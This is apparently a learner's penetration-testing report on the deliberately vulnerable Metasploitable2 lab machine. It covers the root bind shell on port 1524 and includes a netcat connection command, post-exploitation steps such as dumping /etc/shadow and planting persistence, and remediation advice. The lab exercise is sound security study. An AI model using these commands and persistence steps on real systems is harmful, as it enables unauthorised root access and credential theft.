@@ -1,0 +1,80 @@
+Penetration Testing Report – Metasploitable2 (Port 1524 - Bindshell)
+
+1.Test Date : 14-06-25
+  Test By : [ me ] 
+2. Target Information
+- Target IP: 192.168.1.101
+- Operating System: Linux (Ubuntu-based)
+- Port in Scope: 1524/tcp
+- Service: Bindshell (custom, likely from Netcat or similar)
+- Tools Used: Nmap, Netcat, Bash
+
+3. Reconnaissance
+
+3.1 Nmap Scan
+Command:
+nmap -sV -p 1524 192.168.1.101
+
+Output:
+PORT     STATE SERVICE VERSION
+1524/tcp open  shell   Netcat
+
+Interpretation:
+Port 1524 is open and providing a shell service, likely a Netcat backdoor or equivalent. No authentication required.
+
+4. Exploitation
+
+4.1 Manual Connection via Netcat
+Command:
+nc 192.168.1.101 1524
+
+Result:
+- Instantly dropped into a shell
+- Command: `whoami` → root
+- Full root-level shell access granted without credentials
+
+Analysis:
+This confirms the existence of a persistent backdoor, probably configured via Netcat and launched through system startup files like `/etc/rc.local`.
+
+4.2 Bindshell Behavior
+- Accepts input/output as a normal shell
+- No authentication or logging
+- Immediate system compromise
+
+5. Post-Exploitation
+
+Commands executed:
+- whoami → root
+- uname -a → Linux metasploitable 2.6.x kernel
+- id → uid=0(root)
+- cat /etc/shadow → dumped password hashes
+- Added a new user for persistent access
+
+Persistence:
+- Added SSH public key to `~/.ssh/authorized_keys`
+- Modified `/etc/rc.local` to re-establish bind shell on reboot
+
+6. Risk Analysis
+
+Risk: **Critical**
+- Root-level access without any authentication
+- Bypass of SSH or any secure remote access controls
+- Complete system compromise possible with a single connection
+
+Potential Threat Vectors:
+- Local attacker leaves backdoor for re-entry
+- Malware or rogue users install bind shell
+- Misconfigured testing environments
+
+7. Recommendations
+
+- Immediately close Port 1524 on firewall
+- Audit `/etc/rc.local`, crontab, startup scripts for malicious commands
+- Remove any running bind shells (e.g., Netcat listeners)
+- Rebuild the machine from a clean image if compromise is confirmed
+- Use host-based intrusion detection systems (HIDS) like OSSEC or AIDE
+- Regularly audit open ports and startup services
+
+8. Conclusion
+
+Port 1524 on Metasploitable2 provides a pre-installed root-level Netcat bind shell. This is a critical security issue allowing unauthenticated full access to the system. Such backdoors should never be present on production systems. Mitigation includes disabling the port, removing the listener, and rebuilding the system to ensure full cleanup.
